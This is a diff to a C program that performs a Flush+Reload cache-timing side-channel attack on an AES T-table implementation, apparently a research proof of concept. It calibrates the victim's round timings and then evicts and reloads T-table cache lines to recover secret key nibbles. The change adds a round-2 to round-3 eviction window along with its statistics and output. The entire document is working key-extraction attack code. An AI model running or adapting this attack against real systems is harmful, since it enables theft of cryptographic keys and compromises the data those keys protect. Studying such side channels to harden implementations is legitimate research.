@@ -329,6 +329,7 @@ typedef struct{
     uint64_t *round1_end_offset;
     uint64_t *round2_start_offset;
     uint64_t *round2_end_offset;
+    uint64_t *round3_start_offset;
     int count;
 } timing_profile_t;
 
@@ -350,10 +351,12 @@ typedef struct{
     uint64_t phase2_reload_window;
     uint64_t phase3_evict_window;
     uint64_t phase3_reload_window;
+    uint64_t phase4_evict_window;
 
     double phase2_coverage_percent;
     double phase3_evict_coverage_percent;
     double phase3_reload_coverage_percent;
+    double phase4_evict_coverage_percent;
 } attack_windows_t;
 
 typedef struct{
@@ -526,22 +529,26 @@ static void calibrate_phase_timing(control_block_t *control,int calibration_trac
     profile->round1_end_offset=calloc((size_t)calibration_traces,sizeof(uint64_t));
     profile->round2_start_offset=calloc((size_t)calibration_traces,sizeof(uint64_t));
     profile->round2_end_offset=calloc((size_t)calibration_traces,sizeof(uint64_t));
+    profile->round3_start_offset=calloc((size_t)calibration_traces,sizeof(uint64_t));
 
-    if(profile->round1_end_offset==NULL||profile->round2_start_offset==NULL||profile->round2_end_offset==NULL){
+    if(profile->round1_end_offset==NULL||profile->round2_start_offset==NULL||profile->round2_end_offset==NULL||profile->round3_start_offset==NULL){
         free(profile->round1_end_offset);
         free(profile->round2_start_offset);
         free(profile->round2_end_offset);
+        free(profile->round3_start_offset);
         die("calloc timing profile");
     }
 
     uint64_t *r1_duration=calloc((size_t)calibration_traces,sizeof(uint64_t));
     uint64_t *r2_duration=calloc((size_t)calibration_traces,sizeof(uint64_t));
-    uint64_t *gap_duration=calloc((size_t)calibration_traces,sizeof(uint64_t));
+    uint64_t *gap12_duration=calloc((size_t)calibration_traces,sizeof(uint64_t));
+    uint64_t *gap23_duration=calloc((size_t)calibration_traces,sizeof(uint64_t));
 
-    if(r1_duration==NULL||r2_duration==NULL||gap_duration==NULL){
+    if(r1_duration==NULL||r2_duration==NULL||gap12_duration==NULL||gap23_duration==NULL){
         free(r1_duration);
         free(r2_duration);
-        free(gap_duration);
+        free(gap12_duration);
+        free(gap23_duration);
         die("calloc timing statistics");
     }
 
@@ -551,26 +558,30 @@ static void calibrate_phase_timing(control_block_t *control,int calibration_trac
 
         uint64_t t0=rdtsc_now();
 
-        run_victim_blocking(control,CONTROL_MODE_ROUND2_NOFLUSH,plaintext);
+        run_victim_blocking(control,CONTROL_MODE_ROUND3_NOFLUSH,plaintext);
 
         uint64_t r1_end=control->round1_end_tsc;
         uint64_t r2_start=control->round2_start_tsc;
         uint64_t r2_end=control->round2_end_tsc;
+        uint64_t r3_start=control->round3_start_tsc;
 
-        if(r1_end<=t0||r2_start<=r1_end||r2_end<=r2_start){
+        if(r1_end<=t0||r2_start<=r1_end||r2_end<=r2_start||r3_start<=r2_end){
             free(r1_duration);
             free(r2_duration);
-            free(gap_duration);
+            free(gap12_duration);
+            free(gap23_duration);
             die("invalid victim timing calibration sample");
         }
 
         profile->round1_end_offset[i]=r1_end-t0;
         profile->round2_start_offset[i]=r2_start-t0;
         profile->round2_end_offset[i]=r2_end-t0;
+        profile->round3_start_offset[i]=r3_start-t0;
 
         r1_duration[i]=r1_end-control->round1_start_tsc;
         r2_duration[i]=r2_end-r2_start;
-        gap_duration[i]=r2_start-r1_end;
+        gap12_duration[i]=r2_start-r1_end;
+        gap23_duration[i]=r3_start-r2_end;
 
         if((i+1)%500==0||i+1==calibration_traces){
             printf("\r[+] Calibration traces: %d/%d",i+1,calibration_traces);
@@ -582,26 +593,32 @@ static void calibrate_phase_timing(control_block_t *control,int calibration_trac
 
     printf(
         "[+] Round-1 T-table duration: mean=%.1f p50=%llu p95=%llu cycles\n"
-        "[+] Inter-round non-T-table gap: mean=%.1f p50=%llu p95=%llu cycles\n"
-        "[+] Round-2 T-table duration: mean=%.1f p50=%llu p95=%llu cycles\n",
+        "[+] Inter-round (1->2) non-T-table gap: mean=%.1f p50=%llu p95=%llu cycles\n"
+        "[+] Round-2 T-table duration: mean=%.1f p50=%llu p95=%llu cycles\n"
+        "[+] Inter-round (2->3) non-T-table gap: mean=%.1f p50=%llu p95=%llu cycles\n",
 
         mean_u64(r1_duration,calibration_traces),
         (unsigned long long)percentile_u64(r1_duration,calibration_traces,50.0),
         (unsigned long long)percentile_u64(r1_duration,calibration_traces,95.0),
 
-        mean_u64(gap_duration,calibration_traces),
-        (unsigned long long)percentile_u64(gap_duration,calibration_traces,50.0),
-        (unsigned long long)percentile_u64(gap_duration,calibration_traces,95.0),
+        mean_u64(gap12_duration,calibration_traces),
+        (unsigned long long)percentile_u64(gap12_duration,calibration_traces,50.0),
+        (unsigned long long)percentile_u64(gap12_duration,calibration_traces,95.0),
 
         mean_u64(r2_duration,calibration_traces),
         (unsigned long long)percentile_u64(r2_duration,calibration_traces,50.0),
-        (unsigned long long)percentile_u64(r2_duration,calibration_traces,95.0)
+        (unsigned long long)percentile_u64(r2_duration,calibration_traces,95.0),
+
+        mean_u64(gap23_duration,calibration_traces),
+        (unsigned long long)percentile_u64(gap23_duration,calibration_traces,50.0),
+        (unsigned long long)percentile_u64(gap23_duration,calibration_traces,95.0)
     );
 
     printf(
         "[+] Request -> round-1 end: p50=%llu p95=%llu p99=%llu cycles\n"
         "[+] Request -> round-2 start: p50=%llu p95=%llu p99=%llu cycles\n"
-        "[+] Request -> round-2 end: p50=%llu p95=%llu p99=%llu cycles\n",
+        "[+] Request -> round-2 end: p50=%llu p95=%llu p99=%llu cycles\n"
+        "[+] Request -> round-3 start: p50=%llu p95=%llu p99=%llu cycles\n",
 
         (unsigned long long)percentile_u64(profile->round1_end_offset,calibration_traces,50.0),
         (unsigned long long)percentile_u64(profile->round1_end_offset,calibration_traces,95.0),
@@ -613,12 +630,17 @@ static void calibrate_phase_timing(control_block_t *control,int calibration_trac
 
         (unsigned long long)percentile_u64(profile->round2_end_offset,calibration_traces,50.0),
         (unsigned long long)percentile_u64(profile->round2_end_offset,calibration_traces,95.0),
-        (unsigned long long)percentile_u64(profile->round2_end_offset,calibration_traces,99.0)
+        (unsigned long long)percentile_u64(profile->round2_end_offset,calibration_traces,99.0),
+
+        (unsigned long long)percentile_u64(profile->round3_start_offset,calibration_traces,50.0),
+        (unsigned long long)percentile_u64(profile->round3_start_offset,calibration_traces,95.0),
+        (unsigned long long)percentile_u64(profile->round3_start_offset,calibration_traces,99.0)
     );
 
     free(r1_duration);
     free(r2_duration);
-    free(gap_duration);
+    free(gap12_duration);
+    free(gap23_duration);
 }
 
 
@@ -635,6 +657,10 @@ static void calibrate_phase_timing(control_block_t *control,int calibration_trac
  *
  * The best fixed start time is the timestamp contained in the
  * largest number of those safe intervals.
+ *
+ * The same construction is reused verbatim for the round-2/round-3
+ * window: substitute round2_end for round1_end, and round3_start
+ * for round2_start.
  */
 
 static double choose_best_safe_window(const uint64_t *left,const uint64_t *right,int count,uint64_t *out_window){
@@ -697,10 +723,12 @@ static attack_windows_t choose_attack_windows(const timing_profile_t *timing,con
 
     uint64_t *phase2_right=calloc((size_t)timing->count,sizeof(uint64_t));
     uint64_t *phase3_evict_right=calloc((size_t)timing->count,sizeof(uint64_t));
+    uint64_t *phase4_evict_right=calloc((size_t)timing->count,sizeof(uint64_t));
 
-    if(phase2_right==NULL||phase3_evict_right==NULL){
+    if(phase2_right==NULL||phase3_evict_right==NULL||phase4_evict_right==NULL){
         free(phase2_right);
         free(phase3_evict_right);
+        free(phase4_evict_right);
         die("calloc window bounds");
     }
 
@@ -716,12 +744,27 @@ static attack_windows_t choose_attack_windows(const timing_profile_t *timing,con
         } else {
             phase3_evict_right[i]=0;
         }
+
+        //round-2/round-3 window: mirrors the phase3_evict_right construction
+        //above, one round later (round2_end in place of round1_end's role,
+        //round3_start in place of round2_start's role).
+        if(timing->round3_start_offset[i]>=primitive->flush_all_guard){
+            phase4_evict_right[i]=timing->round3_start_offset[i]-primitive->flush_all_guard;
+        } else {
+            phase4_evict_right[i]=0;
+        }
     }
 
     windows.phase2_coverage_percent=choose_best_safe_window(timing->round1_end_offset,phase2_right,timing->count,&windows.phase2_reload_window);
     windows.phase3_evict_coverage_percent=choose_best_safe_window(timing->round1_end_offset,phase3_evict_right,timing->count,&windows.phase3_evict_window);
 
     windows.phase3_reload_window=percentile_u64(timing->round2_end_offset,timing->count,round2_reload_percentile);
+
+    //round-2/round-3 eviction window: same construction as
+    //phase3_evict_window, using round2_end as the left bound (the
+    //earliest safe point, mirroring round1_end above) and
+    //phase4_evict_right as the right bound (mirroring phase3_evict_right).
+    windows.phase4_evict_coverage_percent=choose_best_safe_window(timing->round2_end_offset,phase4_evict_right,timing->count,&windows.phase4_evict_window);
 
     int reload_after_count=0;
 
@@ -735,6 +778,7 @@ static attack_windows_t choose_attack_windows(const timing_profile_t *timing,con
 
     free(phase2_right);
     free(phase3_evict_right);
+    free(phase4_evict_right);
 
     return windows;
 }
@@ -743,10 +787,12 @@ static void free_timing_profile(timing_profile_t *profile){
     free(profile->round1_end_offset);
     free(profile->round2_start_offset);
     free(profile->round2_end_offset);
+    free(profile->round3_start_offset);
 
     profile->round1_end_offset=NULL;
     profile->round2_start_offset=NULL;
     profile->round2_end_offset=NULL;
+    profile->round3_start_offset=NULL;
 
     profile->count=0;
 }
@@ -779,7 +825,7 @@ static void print_attack_windows(const attack_windows_t *windows,const primitive
     );
 
     printf(
-        "[+] Phase 3 evict window: %llu cycles after request\n"
+        "[+] Phase 3 evict window (round1->round2): %llu cycles after request\n"
         "    predicted safe calibration traces: %.1f%%\n",
 
         (unsigned long long)windows->phase3_evict_window,
@@ -795,15 +841,31 @@ static void print_attack_windows(const attack_windows_t *windows,const primitive
         windows->phase3_reload_coverage_percent
     );
 
+    printf(
+        "[+] Phase 4 evict window (round2->round3): %llu cycles after request\n"
+        "    predicted safe calibration traces: %.1f%%\n",
+
+        (unsigned long long)windows->phase4_evict_window,
+        windows->phase4_evict_coverage_percent
+    );
+
     if(windows->phase2_coverage_percent<50.0){
         printf("[!] Phase 2 has no strong stable timing window on this run.\n");
     }
 
     if(windows->phase3_evict_coverage_percent<50.0){
         printf(
-            "[!] Phase 3 has no strong stable inter-round eviction window on this run.\n"
+            "[!] Phase 3 has no strong stable inter-round (1->2) eviction window on this run.\n"
             "    The no-sleep build can legitimately fail here because the natural\n"
             "    gap is shorter than the measured Flush+Reload operation.\n"
+        );
+    }
+
+    if(windows->phase4_evict_coverage_percent<50.0){
+        printf(
+            "[!] Phase 4 has no strong stable inter-round (2->3) eviction window on this run.\n"
+            "    This does not affect key recovery (round 3 is not used for recovery),\n"
+            "    but it means the round2->round3 window could not be reliably isolated.\n"
         );
     }
 }
@@ -827,7 +889,7 @@ static int recover_high_nibble_windowed(int byte_index,void *ttable,control_bloc
 
             uint64_t t0=rdtsc_now();
 
-            uint32_t request=issue_request_async(control,CONTROL_MODE_ROUND2_NOFLUSH,plaintext);
+            uint32_t request=issue_request_async(control,CONTROL_MODE_ROUND3_NOFLUSH,plaintext);
 
             busy_wait_until(t0,window);
 
@@ -843,7 +905,7 @@ static int recover_high_nibble_windowed(int byte_index,void *ttable,control_bloc
                 delta[p_high][local_line]+=timing_signal(baseline[global_line],observed);
             }
 
-            //the victim is allowed to finish naturally.
+            //the victim is allowed to finish naturally (through round 3).
             wait_for_response(control,request);
         }
 
@@ -1080,7 +1142,16 @@ static void recover_low_group(second_round_group_t group,const uint8_t high[16],
 
 
 //phase 3 sample collection
-static void collect_round2_sample_windowed(void *ttable,control_block_t *control,uint64_t baseline[TOTAL_LINES],uint64_t evict_window,uint64_t reload_window,round2_sample_t *sample){
+//
+//Collects a round-2 T-table trace exactly as before (evict round-1,
+//wait for the calibrated post-round-2 point, reload all lines). After
+//that capture, it additionally performs the round2->round3 eviction
+//at phase4_evict_window, mirroring the round1->round2 eviction above
+//with no new logic. This round-3 eviction is not read back or used
+//for recovery -- it exists only so the round-2/round-3 window is
+//actually exercised, matching the real pipeline
+//(flush->round1->reload->flush->round2->reload->round3).
+static void collect_round2_sample_windowed(void *ttable,control_block_t *control,uint64_t baseline[TOTAL_LINES],uint64_t evict_window,uint64_t reload_window,uint64_t phase4_evict_window,round2_sample_t *sample){
     random_plaintext(sample->plaintext);
 
     //first flush+reload eviction:
@@ -1089,13 +1160,13 @@ static void collect_round2_sample_windowed(void *ttable,control_block_t *control
 
     uint64_t t0=rdtsc_now();
 
-    uint32_t request=issue_request_async(control,CONTROL_MODE_ROUND2_NOFLUSH,sample->plaintext);
+    uint32_t request=issue_request_async(control,CONTROL_MODE_ROUND3_NOFLUSH,sample->plaintext);
 
-    //wait for the automatically calibrated inter-round point.
+    //wait for the automatically calibrated inter-round (1->2) point.
     //no victim-side synchronization is involved.
     busy_wait_until(t0,evict_window);
 
-    //the attacker performs the inter-round eviction here.
+    //the attacker performs the round1->round2 eviction here.
     flush_all_lines(ttable);
 
     //wait until the automatically calibrated post-round-2 point.
@@ -1113,7 +1184,18 @@ static void collect_round2_sample_windowed(void *ttable,control_block_t *control
         raw[line]=timing_signal(baseline[line],timing);
     }
 
-    //finish the request before starting the next one.
+    //round2->round3 eviction: same construction as the round1->round2
+    //eviction above, performed at the calibrated phase-4 window so the
+    //attacker also exercises the gap between round 2 and round 3. This
+    //happens after the round-2 reload has already been captured, so it
+    //cannot affect round-2 recovery; round 3 itself is not sampled.
+    if(phase4_evict_window>reload_window){
+        busy_wait_until(t0,phase4_evict_window);
+    }
+    flush_all_lines(ttable);
+
+    //finish the request before starting the next one (the victim
+    //continues on into round 3 on its own).
     wait_for_response(control,request);
 
     //normalize each table independently, as in the working two-round attack.
@@ -1227,6 +1309,9 @@ int main(int argc,char **argv){
     //if the measured flush+reload operation cannot fit inside
     //the measured natural inter-round gap, do not pretend that
     //the resulting trace is a clean round-1/round-2 trace.
+    //(the round-2/round-3 window, phase4, is not required for key
+    //recovery, so it is not part of this fail-fast gate -- only
+    //reported.)
     if(windows.phase2_coverage_percent<=0.0||windows.phase3_evict_coverage_percent<=0.0){
 
         fprintf(
@@ -1259,12 +1344,12 @@ int main(int argc,char **argv){
         high[byte_index]=(uint8_t)recover_high_nibble_windowed(byte_index,ttable,control,baseline,windows.phase2_reload_window,phase2_repeats);
     }
 
-    //phase 3: round-2 low-nibble recovery
+    //phase 3: round-2 low-nibble recovery (+ round2->round3 eviction)
     printf(
         "\n============================================================\n"
         "        PHASE 3: WINDOWED ROUND-2 LOW-NIBBLE RECOVERY\n"
         "============================================================\n"
-        "[+] Collecting %d windowed two-round traces...\n",
+        "[+] Collecting %d windowed traces (pipeline runs through round 3)...\n",
         phase3_traces
     );
 
@@ -1272,7 +1357,7 @@ int main(int argc,char **argv){
     if(samples==NULL)die("calloc samples");
 
     for(int trace=0;trace<phase3_traces;trace++){
-        collect_round2_sample_windowed(ttable,control,baseline,windows.phase3_evict_window,windows.phase3_reload_window,&samples[trace]);
+        collect_round2_sample_windowed(ttable,control,baseline,windows.phase3_evict_window,windows.phase3_reload_window,windows.phase4_evict_window,&samples[trace]);
 
         if((trace+1)%200==0||trace+1==phase3_traces){
             printf("\r[+] Traces: %d/%d",trace+1,phase3_traces);
